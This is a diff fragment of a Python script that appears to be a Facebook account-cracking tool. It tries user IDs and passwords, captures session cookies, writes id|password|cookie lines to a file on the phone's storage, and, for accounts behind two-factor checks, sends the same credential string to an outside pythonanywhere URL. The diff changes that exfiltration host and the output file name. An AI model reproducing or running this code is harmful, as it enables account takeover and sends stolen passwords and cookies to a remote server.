@@ -1131,12 +1131,13 @@ def mbasic(uid,pwx,tl):
                     if '%3A-1%3A-1' in coki:
                         print(f"{green}(HAMSTER-LGN){cid}|{pw}")
                         print(f" {green}COKI : {green}{coki}")
-                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        open("/sdcard/HAMSTER-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
                         break
                     else:
-                        print(f"{RED}(2F){cid}")
+                        print(f"{red}(2F){cid}")
                         statusok = (f"{cid}|{pw}|{coki}")
-                        requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         break
                 else:
                     break
